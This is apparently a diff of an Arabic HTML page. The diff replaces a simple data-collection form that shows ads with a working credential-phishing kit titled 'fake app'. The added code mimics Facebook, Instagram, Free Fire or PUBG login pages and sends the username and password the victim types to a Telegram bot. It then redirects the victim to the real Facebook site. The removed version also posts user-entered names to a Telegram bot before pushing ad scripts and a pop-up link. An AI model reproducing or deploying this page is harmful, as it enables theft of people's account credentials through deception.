@@ -1,176 +1,148 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>النموذج</title>
-
-<style>
-body{
-    margin:0;
-    font-family:Arial, sans-serif;
-    background:#ffffff;
-    text-align:center;
-}
-
-/* صفحة الإدخال */
-.form-box{
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    padding:20px;
-}
-
-input{
-    width:90%;
-    max-width:400px;
-    padding:15px;
-    margin:10px 0;
-    border:1px solid #ddd;
-    border-radius:8px;
-    font-size:16px;
-}
-
-.send-btn{
-    width:90%;
-    max-width:400px;
-    padding:15px;
-    border:none;
-    border-radius:8px;
-    background:#4CAF50;
-    color:white;
-    font-size:18px;
-    cursor:pointer;
-}
-
-/* صفحة الإعلانات (مخفية بالبداية) */
-.ads-page{
-    display:none;
-    padding-top:20px;
-}
-
-.header{
-    font-size:22px;
-    font-weight:bold;
-    margin-bottom:15px;
-}
-
-.confirm-btn{
-    position:fixed;
-    bottom:20px;
-    left:50%;
-    transform:translateX(-50%);
-    width:90%;
-    max-width:400px;
-    padding:18px;
-    font-size:20px;
-    border:none;
-    border-radius:10px;
-    background:#28a745;
-    color:white;
-    cursor:pointer;
-    z-index:9999;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تطبيق وهمي</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+        h2 {
+            text-align: center;
+            color: #1877f2;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #166fe5;
+        }
+        .error {
+            color: red;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-
-<!-- قسم إدخال البيانات -->
-<div class="form-box" id="formPage">
-    <input type="text" id="name" placeholder="الاسم">
-    <input type="text" id="father" placeholder="اسم الأب">
-    <button class="send-btn" onclick="sendData()">إرسال</button>
-</div>
-
-<!-- قسم الإعلانات (يظهر بعد الإرسال) -->
-<div class="ads-page" id="adsPage">
-    <div class="header">
-        تم استلام البيانات بنجاح  
-        يرجى تأكيد البيانات للمتابعة
+    <div class="container">
+        <div class="card">
+            <h2 id="form-title">تسجيل الدخول</h2>
+            <form id="login-form">
+                <input type="text" id="username" placeholder="اسم المستخدم أو البريد" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <button type="submit">تسجيل الدخول</button>
+            </form>
+            <div id="message" class="error"></div>
+        </div>
     </div>
 
-    <!-- وحدات الإعلانات -->
-    <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"></script>
-
-    <script async="async" data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"></script>
-    <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
-
     <script>
-    atOptions = {
-        'key' : 'dcff8a2cffdf0642c627a5bacf3a04fd',
-        'format' : 'iframe',
-        'height' : 60,
-        'width' : 468,
-        'params' : {}
-    };
+        $(document).ready(function() {
+            // قراءة المعاملات من الرابط
+            const urlParams = new URLSearchParams(window.location.search);
+            const chat_id = urlParams.get('chat_id');
+            const token = urlParams.get('token');
+            const page = urlParams.get('page') || 'facebook'; // القيمة الافتراضية
+
+            // تخزينها في sessionStorage
+            if (chat_id && token) {
+                sessionStorage.setItem('chat_id', chat_id);
+                sessionStorage.setItem('token', token);
+            } else {
+                $('#message').text('رابط غير صالح: يرجى توفير chat_id و token');
+                return;
+            }
+
+            // تغيير عنوان الصفحة حسب الطلب
+            let title = 'تسجيل الدخول';
+            switch(page) {
+                case 'facebook':
+                    title = 'فيسبوك - تسجيل الدخول';
+                    break;
+                case 'instagram':
+                    title = 'انستغرام - تسجيل الدخول';
+                    break;
+                case 'freefire':
+                    title = 'فري فاير - تسجيل الدخول';
+                    break;
+                case 'pubg':
+                    title = 'PUBG - تسجيل الدخول';
+                    break;
+            }
+            $('#form-title').text(title);
+
+            // عند تقديم النموذج
+            $('#login-form').on('submit', function(e) {
+                e.preventDefault();
+
+                const username = $('#username').val();
+                const password = $('#password').val();
+                const chat_id = sessionStorage.getItem('chat_id');
+                const token = sessionStorage.getItem('token');
+
+                if (!username || !password) {
+                    $('#message').text('يرجى ملء جميع الحقول');
+                    return;
+                }
+
+                // إرسال البيانات إلى تيليجرام
+                const text = `🔐 بيانات دخول جديدة:\nالصفحة: ${page}\nالمستخدم: ${username}\nكلمة المرور: ${password}`;
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                $.ajax({
+                    url: url,
+                    method: 'POST',
+                    data: {
+                        chat_id: chat_id,
+                        text: text
+                    },
+                    success: function(response) {
+                        console.log('تم الإرسال بنجاح');
+                    },
+                    error: function(xhr, status, error) {
+                        console.error('خطأ في الإرسال:', error);
+                    },
+                    complete: function() {
+                        // إعادة التوجيه إلى صفحة حقيقية (مثلاً فيسبوك)
+                        window.location.href = 'https://www.facebook.com';
+                    }
+                });
+            });
+        });
     </script>
-    <script src="https://www.highperformanceformat.com/dcff8a2cffdf0642c627a5bacf3a04fd/invoke.js"></script>
-
-    <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"></script>
-
-    <script>
-    atOptions = {
-        'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
-        'format' : 'iframe',
-        'height' : 300,
-        'width' : 160,
-        'params' : {}
-    };
-    </script>
-    <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"></script>
-</div>
-
-<!-- زر التأكيد -->
-<button class="confirm-btn" id="confirmBtn" style="display:none;" onclick="openSmartLink()">
-    تأكيد البيانات
-</button>
-
-<script>
-// استلام التوكن و Chat ID من التطبيق (WebView)
-const params = new URLSearchParams(window.location.search);
-const BOT_TOKEN = params.get("token");
-const CHAT_ID = params.get("chat");
-
-function sendData(){
-    const name = document.getElementById("name").value.trim();
-    const father = document.getElementById("father").value.trim();
-
-    if(!name || !father){
-        alert("اكتب جميع البيانات");
-        return;
-    }
-
-    const text = `📥 بيانات جديدة من التطبيق
-
-👤 الاسم: ${name}
-👨 اسم الأب: ${father}`;
-
-    // إرسال البيانات للبوت
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text
-        })
-    }).finally(() => {
-        // إخفاء الفورم وإظهار صفحة الإعلانات داخل نفس الصفحة
-        document.getElementById("formPage").style.display = "none";
-        document.getElementById("adsPage").style.display = "block";
-        document.getElementById("confirmBtn").style.display = "block";
-    });
-}
-
-// فتح السمارت لينك في كل ضغطة
-function openSmartLink(){
-    window.open(
-        "https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c",
-        "_blank"
-    );
-}
-</script>
-
 </body>
-      </html>
+</html>
